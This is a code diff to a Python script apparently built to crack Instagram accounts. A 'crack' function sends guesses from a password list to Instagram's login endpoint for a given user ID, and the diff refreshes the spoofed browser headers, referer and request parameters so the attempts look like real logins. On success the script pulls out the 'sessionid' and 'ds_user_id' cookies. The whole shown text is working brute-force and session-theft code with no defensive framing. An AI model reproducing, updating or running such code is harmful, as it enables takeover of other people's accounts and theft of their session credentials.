@@ -107,52 +107,37 @@ def crack(uid, password_list, total_count):
             csrftoken = response.cookies.get('csrftoken')
             time_now = int(datetime.now().timestamp())
             enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{pw}"
-            cookies = {
-            'datr': 'wDF1aOt9UdNuCskTeplHs7Yx',
-            'ig_did': str(uuid.uuid4()).upper(),
-            'mid': 'aHUxwQALAAEhOjO5lKEpzt85Xu9g',
-            'ig_nrcb': '1',
-            'ps_l': '1',
-            'ps_n': '1',
-            'csrftoken': csrftoken,
-            'wd': '1155x773',}
             headers = {
-            'accept': '*/*',
-            'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,hi;q=0.6,gu;q=0.5,bn;q=0.4',
-            'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://www.instagram.com',
-            'priority': 'u=1, i',
-            'referer': 'https://www.instagram.com/accounts/login/?source=desktop_dynamic_landing_dialog',
-            'sec-ch-prefers-color-scheme': 'dark',
-            'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
-            'sec-ch-ua-full-version-list': '"Google Chrome";v="143.0.7499.170", "Chromium";v="143.0.7499.170", "Not A(Brand";v="24.0.0.0"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-model': '""',
+            'sec-ch-ua-full-version-list': '"Not(A:Brand";v="8.0.0.0", "Chromium";v="144.0.7559.31", "Google Chrome";v="144.0.7559.31"',
             'sec-ch-ua-platform': '"Windows"',
-            'sec-ch-ua-platform-version': '"10.0.0"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-origin',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
-            'x-asbd-id': '359341',
-            'x-csrftoken': csrftoken,
-            'x-ig-app-id': '936619743392459',
-            'x-ig-www-claim': '0',
-            'x-instagram-ajax': '1031477873',
-            'x-requested-with': 'XMLHttpRequest',
-            'x-web-session-id': '98ab8d:bozgai:ippqsi',}
+            'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
+            'sec-ch-ua-model': '""',
+            'sec-ch-ua-mobile': '?0',
+            'X-IG-App-ID': '936619743392459',
+            'X-Requested-With': 'XMLHttpRequest',
+            'Accept': '*/*',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'X-Instagram-AJAX': '1031500594',
+            'X-CSRFToken': csrftoken,
+            'X-Web-Session-ID': 'jovsgr:oncs1z:a7qyib',
+            'Referer': 'https://www.instagram.com/accounts/login/?force_authentication&platform_app_id=1289884158313322&enable_fb_login&request_id=5d21cc15-8454-46e4-84e5-488f9d2a0456&next=https%3A%2F%2Fwww.instagram.com%2Foauth%2Foidc%2F%3Fapp_id%3D1289884158313322%26redirect_uri%3Dhttps%253A%252F%252Fwww.threads.com%252Flogin%252Foidc%252F%26response_type%3Dcode%26scope%3Dopenid%26state%3DATnsphCFw1GW0GEttK5ysXDOj_rBB0zRUl2FJJb4W-J_Tveiu5MwPK-AzeyNNm7Hpc9MElBNElvzE1q87lrLJ6n8ZfdjgxqBHirzde-lfwAqJzfv85waADvjV2HWahwIzv50lHioDZbDKGqmMyfTjwj40zCWEe2yNoBBCog2nqg%26logger_id%3D5d21cc15-8454-46e4-84e5-488f9d2a0456%26force_consent%3D0%26force_authentication%3D0',
+            'X-ASBD-ID': '359341',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
+            'X-IG-WWW-Claim': '0',
+            'sec-ch-ua-platform-version': '"10.0.0"',}
             data = {
             'enc_password': enc_password,
             'caaF2DebugGroup': '0',
             'isPrivacyPortalReq': 'false',
             'loginAttemptSubmissionCount': '0',
             'optIntoOneTap': 'false',
-            'queryParams': '{"source":"desktop_dynamic_landing_dialog"}',
+            'queryParams': '{"force_authentication":null,"platform_app_id":"1289884158313322","enable_fb_login":null,"request_id":"5d21cc15-8454-46e4-84e5-488f9d2a0456","next":"https://www.instagram.com/oauth/oidc/?app_id=1289884158313322&redirect_uri=https%3A%2F%2Fwww.threads.com%2Flogin%2Foidc%2F&response_type=code&scope=openid&state=ATnsphCFw1GW0GEttK5ysXDOj_rBB0zRUl2FJJb4W-J_Tveiu5MwPK-AzeyNNm7Hpc9MElBNElvzE1q87lrLJ6n8ZfdjgxqBHirzde-lfwAqJzfv85waADvjV2HWahwIzv50lHioDZbDKGqmMyfTjwj40zCWEe2yNoBBCog2nqg&logger_id=5d21cc15-8454-46e4-84e5-488f9d2a0456&force_consent=0&force_authentication=0"}',
             'trustedDeviceRecords': '{}',
             'username': uid,
-            'jazoest': '22841',}
+            'jazoest': '22064',}
             # Make API request
-            response = session.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', cookies=cookies, headers=headers, data=data)
+            response = session.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', headers=headers, data=data)
             wanted = ["ds_user_id", "sessionid"]
             all_cookies = session.cookies.get_dict()
             extracted = {k: all_cookies[k] for k in wanted if k in all_cookies}
